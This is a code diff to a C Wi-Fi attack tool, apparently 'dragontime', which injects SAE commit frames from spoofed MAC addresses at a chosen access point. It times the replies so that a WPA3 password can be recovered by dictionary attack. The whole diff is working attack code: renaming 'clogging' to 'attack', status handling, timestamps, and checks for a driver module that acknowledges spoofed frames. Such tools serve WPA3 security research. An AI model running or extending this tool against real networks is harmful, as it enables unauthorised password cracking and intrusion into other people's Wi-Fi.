@@ -28,6 +28,7 @@
 #include <signal.h>
 #include <poll.h>
 #include <assert.h>
+#include <time.h>
 
 #include <openssl/evp.h>
 #include <openssl/ec.h>
@@ -192,7 +193,18 @@ size_t DEAUTH_FRAME_SIZE = sizeof(DEAUTH_FRAME) - 1;
 
 static void sighandler(int signum)
 {
-	if (signum == SIGPIPE) printf("broken pipe!\n");
+	if (signum == SIGPIPE)
+	{
+		printf("broken pipe!\n");
+	} 
+	else if (signum == SIGINT)
+	{
+		time_t t = time(NULL);
+		struct tm tm = *localtime(&t);
+		printf("Stopping at: %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+
+		exit(0);
+	}
 }
 
 struct state_ecc {
@@ -225,7 +237,7 @@ static struct state
 	int num_addresses;
 
 	// TODO: Are these still needed?
-	int started_clogging;
+	int started_attack;
 	int rate;
 	int interval;
 
@@ -281,12 +293,18 @@ card_write(struct state *state, void *buf, int len, struct tx_info *ti)
 	return wi_write(state->wi, buf, len, ti);
 }
 
+static inline int card_get_mac(struct state *state, unsigned char * mac)
+{
+	return wi_get_mac(state->wi, mac);
+}
+
+
 static void
 open_card(struct state *state, char * dev, int chan)
 {
-	printf("Opening card %s\n", dev);
+	fprintf(stderr, "Opening card %s\n", dev);
 	card_open(state, dev);
-	printf("Setting chan %d\n", chan);
+	fprintf(stderr, "Setting chan %d\n", chan);
 	if (card_set_chan(state, chan) == -1) err(1, "card_set_chan()");
 }
 
@@ -396,7 +414,7 @@ static void inject_sae_commit(struct state *state, unsigned char *srcaddr)
 
 static void inject_commits(struct state *state)
 {
-	if (!state->started_clogging)
+	if (!state->started_attack)
 		return;
 
 	debug(state, 2, "Injecting commit frame using group %d\n", state->group);
@@ -435,7 +453,7 @@ static void check_timeout(struct state *state)
 {
 	struct timespec curr, diff;
 
-	if (!state->started_clogging)
+	if (!state->started_attack)
 		return;
 
 	clock_gettime(CLOCK_MONOTONIC, &curr);
@@ -461,9 +479,11 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 
 	//printf("process_packet: %d\n", len);
 
-	/* Ignore retransmitted frames - TODO improve */
-	if (buf[1] & 0x08)
+	/* Ignore retransmitted frames - TODO: Inject new commit if the reply was retransmitted */
+	if (buf[1] & 0x08) {
+		//printf("Ignoring retransmission\n");
 		return;
+	}
 
 	/* Extract addresses */
 	switch (buf[1] & 3)
@@ -496,15 +516,19 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 		return;
 
 	/* Inject commit frames every second */
-	if (buf[0] == 0x80 && !state->started_clogging)
+	if (buf[0] == 0x80 && !state->started_attack)
 	{
-		// TODO: Verify this is a beacon frame
-		printf("Detected AP! Starting clogging ...\n");
+		time_t t = time(NULL);
+		struct tm tm = *localtime(&t);
 
-		state->started_clogging = 1;
+		// TODO: Verify this is a beacon frame
+		printf("Detected AP! Starting timing attack at %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900,
+			tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
+
+		state->started_attack = 1;
 	}
 
-	if (len > 24 + 8 &&
+	if (len >= 24 + 8 &&
 		buf[0] == 0xb0 && /* Type is Authentication */
 		buf[24] == 0x03 /*&&*/ /* Auth type is SAE */
 		/*buf[26] == 0x01*/) /* Sequence number is 1 */
@@ -512,14 +536,6 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 		/* Check if status is good and its the first reply */
 		if (buf[28] == 0x00) {
 			struct timespec curr, diff;
-
-			/* Ignore retransmissions - FIXME: It seems aircrack already filters these?! */
-			//printf("%02X %02X .. %02X %02X\n", buf[0], buf[1], buf[22], buf[23]);
-			if ((buf[1] & 0x08) != 0) {
-				debug(state, 2, ">>>>>>>>> Ignore retransmission\n");
-				inject_commits(state);
-				return;
-			}
 
 			clock_gettime(CLOCK_MONOTONIC, &curr);
 			if (curr.tv_nsec > state->prev_commit.tv_nsec) {
@@ -535,11 +551,13 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 
 			printf("STA %02X: %ld miliseconds (TOTAL %d)\n", state->curraddr, diff.tv_nsec / 1000,
 				state->num_injected[state->curraddr]);
+			fflush(stdout);
 
+			// Print out a summary while running to stderr. Results can be captured from stdout.
 			if (state->curraddr == 0 && state->num_injected[state->num_addresses - 1] > 0) {
-				printf("-------------------------------\n");
+				fprintf(stderr, "-------------------------------\n");
 				for (int i = 0; i < state->num_addresses; ++i)
-					printf("Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
+					fprintf(stderr, "Address %02X = %ld\n", i, state->sum_time[i] / (state->num_injected[i] * 1000));
 			}
 
 			inject_deauth(state);
@@ -607,6 +625,13 @@ static void process_packet(struct state *state, unsigned char *buf, int len)
 				perror("card_write");
 			clock_gettime(CLOCK_MONOTONIC, &state->prev_commit);
 		}
+		/* Status equals unsupported group */
+		else if (buf[28] == 0x4d) {
+			printf("WARNING: Authentication rejected due to unsupported group\n");
+		}
+		else {
+			printf("WARNING: Unrecognized status 0x%02X 0x%02X\n", buf[28], buf[29]);
+		}
 	}
 }
 
@@ -633,12 +658,23 @@ static void event_loop(struct state *state, char * dev, int chan)
 	int card_fd, timer_fd;
 	struct itimerspec timespec;
 
+	// 1. Open the card and get the MAC address
 	open_card(state, dev, chan);
 	card_fd = wi_fd(state->wi);
 	card_set_rate(state, USED_RATE);
-	debug(state, 2, "card_fd = %d\n", card_fd);
+	card_get_mac(state, state->srcaddr);
 
+	// 2. Display all info we need to perform the dictionary attack
+	printf("Targeting BSSID %02X:%02X:%02X:%02X:%02X:%02X\n", state->bssid[0], state->bssid[1],
+		state->bssid[2], state->bssid[3], state->bssid[4], state->bssid[5]);
+	printf("Will spoof MAC addresses in the form %02X:%02X:%02X:%02X:%02X:[00-%02X]\n", state->srcaddr[0],
+		state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->num_addresses - 1);
+	printf("Performing attack using group %d\n", state->group);
 
+	// 3. Initialize futher things to start the attack
+	state->srcaddr[5] = state->curraddr;
+
+	// 4. Initialize timers
 	timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
 	if (timer_fd == -1)
 		perror("timerfd_create()");
@@ -650,7 +686,6 @@ static void event_loop(struct state *state, char * dev, int chan)
 	/* periodic expiration of the timer */
 	timespec.it_interval.tv_sec = 0;
 	timespec.it_interval.tv_nsec = 100 * 1000*1000;
-
 	debug(state, 0, "Interval: %d sec, %d usec\n", timespec.it_interval.tv_sec,
 		timespec.it_interval.tv_nsec);
 
@@ -661,8 +696,8 @@ static void event_loop(struct state *state, char * dev, int chan)
 	if (timer_fd == -1)
 		perror("timerfd_create()");
 
-	printf("Searching for AP ...\n");
-
+	// 5. Now start the main event loop
+	fprintf(stderr, "Searching for AP ...\n");
 	while (1)
 	{
 		card_fd = wi_fd(state->wi);
@@ -789,10 +824,33 @@ int initialize_ecc_crypto(struct state_ecc *state_ecc, int group)
 		return -1;
 	}
 
-	printf("Initialized ECC crypto parameters\n");
+	fprintf(stderr, "Initialized ECC crypto parameters\n");
 
 	BN_free(randbn);
 	return 0;
+}
+
+// FIXME: Share this function between dragontime and dragondrain
+static int is_module_loaded(const char *module)
+{
+	char line[256];
+	FILE *fp = NULL;
+	int loaded = 0;
+
+	fp = fopen("/proc/modules", "r");
+	if (fp == NULL) {
+		fprintf(stderr, "Failed to check if kernel module %s is loaded", module);
+		perror("");
+		return 0;
+	}
+
+	while (!loaded && fgets(line, sizeof(line), fp) != NULL) {
+		loaded = strncmp(line, module, strlen(module)) == 0 &&
+		         line[strlen(module)] == ' ';
+	}
+
+	fclose(fp);
+	return loaded;
 }
 
 static void usage(char * p)
@@ -890,7 +948,9 @@ int main(int argc, char * argv[])
 	}
 
 	signal(SIGPIPE, sighandler);
+	signal(SIGINT, sighandler);
 
+	// Sanity-check the parameters
 	if (!device || chan <= 0 || memcmp(state->bssid, ZERO, 6) == 0)
 		usage(argv[0]);
 	if ((state->group < 22 || state->group > 24) && initialize_ecc_crypto(&state->ecc, state->group)) {
@@ -898,14 +958,28 @@ int main(int argc, char * argv[])
 		exit(1);
 	}
 
-	//memcpy(state->srcaddr, "\x2c\xb0\x5d\x5b\xd2\x65", 6);
-	memcpy(state->srcaddr, "\x00\x8e\xf2\x7d\x8b\x37", 6);
-	state->srcaddr[5] = state->curraddr;
-
-	printf("Using source address %02X:%02X:%02X:%02X:%02X:**\n", state->srcaddr[0], state->srcaddr[1],
-		state->srcaddr[2], state->srcaddr[3], state->srcaddr[4]);
+	// Warn user if spoofed addresses won't be acknowledged
+	// FIXME: Check that the device being used is the Atheros one
+	if (!is_module_loaded("ath")) {
+		printf("\n"
+		       "Warning: please use an Atheros device. This tool was only tested using an\n"
+		       "         Atheros ath9k_htc device, combined with the ath_masker kernel module,\n"
+                       "         so that frames sent to the spoofed MAC addresses are acknowledged\n"
+		       "         by the Wi-Fi chip.\n\n"
+		       "         Press CTRL+C to exit, or enter to coninue...");
+		getc(stdin);
+		printf("\n");
+	}
+	if (is_module_loaded("ath") && !is_module_loaded("ath_masker")) {
+		printf("\n"
+		       "Warning: please load the kernel module ath_masker so frames send to spoofed\n"
+		       "         MAC addresses are acknowledged. Download the module code at\n"
+		       "         https://github.com/vanhoefm/ath_masker\n\n"
+		       "         Press CTRL+C to exit, or enter to coninue...");
+		getc(stdin);
+		printf("\n");
+	}
 
 	event_loop(state, device, chan);
-
 	exit(0);
 }
